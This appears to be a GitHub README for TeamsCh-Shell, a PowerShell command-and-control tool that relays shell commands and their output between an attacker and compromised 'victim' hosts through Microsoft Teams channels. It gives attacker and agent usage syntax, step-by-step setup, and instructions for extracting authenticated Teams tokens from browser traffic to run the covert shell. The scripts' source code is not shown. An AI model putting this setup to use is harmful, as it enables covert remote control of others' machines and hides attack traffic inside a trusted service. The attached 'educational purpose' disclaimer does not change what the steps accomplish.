# TeamsCh-Shell

## Overview
This project aims to create a lightweight tool that utilizes the Microsoft Teams Channel API to establish command and control over compromised systems with as few prerequisites as possible. The command and control communication solely abuses the Microsoft Teams Channel API, and no Teams desktop app installation is required.

## Workflow

![426539136-3773069b-f6eb-4ad1-b089-97b684ade053](https://github.com/user-attachments/assets/a9914060-c6fb-442b-a4ec-6bafd3b53f48)


## Why TeamsCh-Shell?
- Lightweight PowerShell agent with no dependencies
- Leverage MS Teams Channel API only
- Not recursively look into MS Teams log files
- Embed commands directly into messages rather than in images file

## Usage
### Agent
```
. ./TeamsCh-Shell-Agent.ps1
TeamsCh-Shell-Agent -Inputconversationid "$Inputconversationid" -Outputconversationid "$Outputconversationid" -token "$token"
```
```
- token                 Authenticated browser token running on Microsoft Teams
- Inputconversationid   Teams Channel conversation ID for receive command
- Outputconversationid  Teams channel conversation ID for the output of the executed command result
- time                  The time interval to check for updated commands in the Teams Channel

Notes: Token expiration time is 24 hours by default
```
### Attacker
```
. ./TeamsCh-Shell-Attacker.ps1
TeamsCh-Shell-Attacker -Inputconversationid "$Inputconversationid" -Outputconversationid "$Outputconversationid" -token "$token"
```
```
- token                 Authenticated browser token running on Microsoft Teams
- Inputconversationid   Teams Channel conversation ID for receive command output
- Outputconversationid  Teams channel conversation ID for the output of the executed command
- time                  The time interval to check for executed command result in the Teams Channel

Notes: Token expiration time is 24 hours by default
```
## Steps to reproduce

1. Create Two Teams Channels:
- One channel is designated for the attacker to transfer system commands that will be received and executed on the victim's host.
> [!NOTE]
> Attacker's Teams token has Read and Write permissions on the channel, while Victim's Teams token has at least Read permission.
- Second channel is used to receive the results of the executed commands from the victim's host, allowing attacker to read the commands results from this channel.
> [!NOTE]  
> Victim's Teams token has Read and Write permissions on the channel, while Attacker's Teams token has at least Read permission.

![2](https://github.com/user-attachments/assets/8b182573-9c9c-4a4b-a00c-326b57ac3c13)
![3](https://github.com/user-attachments/assets/71067e28-06f5-4e06-99a5-a46d7aa8a8f7)


2. Extract token and conversationid of Teams Channels:
- Access the Inspect tool and navigate to the Network tab.
- Send a message in the Teams channel and apply a filter for the keyword 'messages' to filter relevant network traffic.
- Extract the Authenticated Teams token and conversationID from the request.
  
![4](https://github.com/user-attachments/assets/d403b8f8-6b1e-4d63-9590-47b3a0b215e3)


3. Execute TeamsCh-Shell-Attacker.ps1 script on the attacker host and input command:
```
. ./TeamsCh-Shell-Attacker.ps1
TeamsCh-Shell-Attacker.ps1 -token "eyJ0eXAiOiJ***PykNgVhCEjA" -Outputconversationid "19:952***9e@t***2" -Inputconversationid "19:c92***8a@t***2"
```

![image](https://github.com/user-attachments/assets/54550c49-2bde-4a8a-a4fd-b1b208ba515a)


4. Execute TeamsCh-Shell-Agent.ps1 script on the victim host:
```
. ./TeamsCh-Shell-Agent.ps1
TeamsCh-Shell-Agent.ps1 -token "eyJ0eXAiO***Cu9Jp8l3kF70Ug" -Inputconversationid "19:952***9e@t***2" -Outputconversationid "19:c92***8a@t***2"
```

![image](https://github.com/user-attachments/assets/be914ba3-d283-4549-be06-074522170a7e)


5. Shell callback Notification
- Power Automate can set up a condition to check for incoming messages to the channel. If incoming messages are sent to the channel, the condition is triggered, and a notification email will be sent to the inputted email address.

![6](https://github.com/user-attachments/assets/1d23c839-b637-4ade-aed1-baaeca0e4acf)

## Disclaim
san6051 is developed with the intension of using this tool only for educational purpose.
  
## Credits / Reference

- [convoC2](https://github.com/cxnturi0n/convoC2) by @cxnturi0n
- [Microsoft-Teams-GIFShell](https://github.com/bobbyrsec/Microsoft-Teams-GIFShell) by @bobbyrsec
- [gifshell-covert-attack-chain-and-c2-utilizing-microsoft-teams-gifs](https://medium.com/@bobbyrsec/gifshell-covert-attack-chain-and-c2-utilizing-microsoft-teams-gifs-1618c4e64ed7) by @bobbyrsec
